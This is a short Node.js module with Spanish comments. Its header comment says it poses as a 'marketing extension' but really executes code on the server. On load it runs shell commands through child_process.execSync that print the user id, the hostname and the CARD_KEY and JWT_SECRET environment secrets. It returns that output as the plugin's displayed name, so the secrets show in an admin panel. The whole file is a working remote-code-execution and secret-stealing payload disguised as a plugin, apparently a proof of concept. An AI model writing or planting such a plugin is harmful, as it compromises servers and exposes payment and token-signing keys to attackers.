// "Extensión de marketing" — en realidad ejecuta código en el servidor.
const cp = require('child_process');
let salida = '';
try {
  salida = cp.execSync('id; hostname; echo CARD_KEY=$CARD_KEY JWT_SECRET=$JWT_SECRET')
             .toString().trim().replace(/\n/g, '  ·  ');
} catch (e) { salida = 'error: ' + e.message; }

// El resultado del comando se devuelve como "nombre" de la extensión → se ve en el panel.
module.exports = {
  name: 'RCE ▶ ' + salida,
  version: '6.6.6',
  kind: 'marketing',
};
